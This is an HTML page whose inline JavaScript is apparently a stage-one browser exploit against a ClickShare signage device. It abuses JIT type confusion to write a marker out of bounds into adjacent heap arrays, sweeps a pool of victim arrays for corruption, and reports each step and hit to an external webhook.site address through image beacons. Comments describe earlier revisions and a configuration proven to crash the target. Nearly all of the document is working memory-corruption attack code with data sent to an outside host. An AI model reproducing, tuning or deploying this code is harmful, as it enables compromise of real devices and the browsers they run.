<html><body><script>
// ClickShare signage -- stage 1 R4: steerable OOB index (r3 kept a FIXED 0xff00000000 dirty value =>
// write lands ~34GB out, can never hit the adjacent ring; here the dirty value is a parameter swept
// from small offsets up, wild value LAST so the renderer survives long enough to report).
// Lessons baked in: async Image() beacons only, zero blocking, keep ALL victims, PACKED_DOUBLE_ELEMENTS,
// warm 0x500 + 50k (the config PROVEN to tier up TF and crash on this device 26.09 21:23).
const SINK = 'https://webhook.site/d0c9f8c5-8be9-4734-a9ba-adb0216040c3';
const MARKER = 1.2345678901234e-300;
function beacon(t, v){
  try { var i = new Image(); i.src = SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,150)); } catch(e){}
}
beacon('S1-start', navigator.userAgent.slice(0,80));
try {
  const RING = 4000;              // keep ALL victims: OOB writes happen during warm-up, an evicted ring loses evidence
  var ring = [];
  for (let k = 0; k < RING; k++) { var a = new Array(64); for (let z = 0; z < 64; z++) a[z] = 1.0 + z; ring.push(a); }
  var arrx = new Array(150); for (let z = 0; z < 150; z++) arrx[z] = 0.5 + z;
  beacon('S1-pool-done', RING);

  var fake = new Uint32Array(10);
  fake[0]=1; fake[1]=3; fake[2]=2; fake[3]=4; fake[4]=5; fake[5]=6; fake[6]=7; fake[7]=8; fake[8]=9;
  var tahir = 0x1;
  var hits = 0;
  function poc(a, dirt) {
    var oob_array = new Array(5); for (var z=0; z<5; z++) oob_array[z] = 0.5 + z;   // PACKED_DOUBLE_ELEMENTS from the start
    var victim = new Array(64); for (let z = 0; z < 64; z++) victim[z] = 1.0 + z;   // adjacent inline FixedDoubleArray
    if (ring.length < 20000) ring.push(victim);                                      // never evict
    let just_a_variable = fake[0];
    let another_variable3 = fake[7];
    if (a % 7 == 0) another_variable3 = dirt;
    another_variable3 = Math.max(another_variable3, tahir);
    another_variable3 = another_variable3 >>> 0;
    var index = fake[3];
    var for_phi_modes = fake[6];
    let c = fake[1];
    for (var i = 0; i < 10; i++) {
      if (a % 3 == 0) just_a_variable = c;
      if (a % 37 == 0) just_a_variable = fake[2];
      if (a % 11 == 0) just_a_variable = fake[8];
      if (a % 17 == 0) just_a_variable = fake[5];
      if (a % 19 == 0) just_a_variable = fake[4];
      if (a % 7 == 0 && i >= 5) { for_phi_modes = just_a_variable; just_a_variable = another_variable3; }
      if (i >= 6) { for (let j = 0; j < 5; j++) { if (a % 5 == 0) { index = for_phi_modes; oob_array[index] = MARKER; } } }
      for_phi_modes = c; c = just_a_variable;
    }
    return [index, BigInt(just_a_variable)];
  }
  function sweep(tag){
    try { for (let j = 0; j < 150; j++) { if (arrx[j] === MARKER) { if (hits++ < 6) beacon('HIT-arrx','at='+tag+' j='+j); } } } catch(e) { beacon('S1-sweep-exc', tag+':'+String(e).slice(0,60)); }
    for (let k = 0; k < ring.length; k++) {
      var v = ring[k];
      if (v.length !== 64) { if (hits++ < 6) beacon('HIT-len','at='+tag+' k='+k+' len='+v.length); continue; }
      for (let j = 0; j < 64; j++) { if (v[j] === MARKER) { if (hits++ < 6) beacon('HIT-mark','at='+tag+' k='+k+' j='+j); break; } }
    }
    beacon('S1-iter','at='+tag+' hits='+hits);
  }
  for (let i = 2; i < 0x500; i++) poc(i, 0xff00000000);
  beacon('S1-warm-done','ok'); sweep('warm');
  for (let i = 0; i < 50000; i++) poc(i % 500 + 2, 0xff00000000);
  beacon('S1-warm50k-done','ok'); sweep('warm50k');
  // steerable fires: dirt = final uint32 index used by the OOB store (elements + dirt*8 bytes)
  let dirts = [0x400, 0x800, 0x1000, 0x2000, 0x4000, 0x8000, 0x10000, 0x40000];
  for (let t = 0; t < dirts.length; t++) {
    beacon('S1-fire','dirt=0x'+dirts[t].toString(16));
    poc(35, dirts[t]); sweep('d0x'+dirts[t].toString(16));
  }
  beacon('S1-fire','dirt=WILD');
  poc(35, 0xff00000000); sweep('wild');
  beacon('S1-SURVIVED','hits='+hits);
} catch (e) { beacon('S1-exc', String(e).slice(0,120)); }
beacon('S1-done','end-of-page');
</script></body></html>
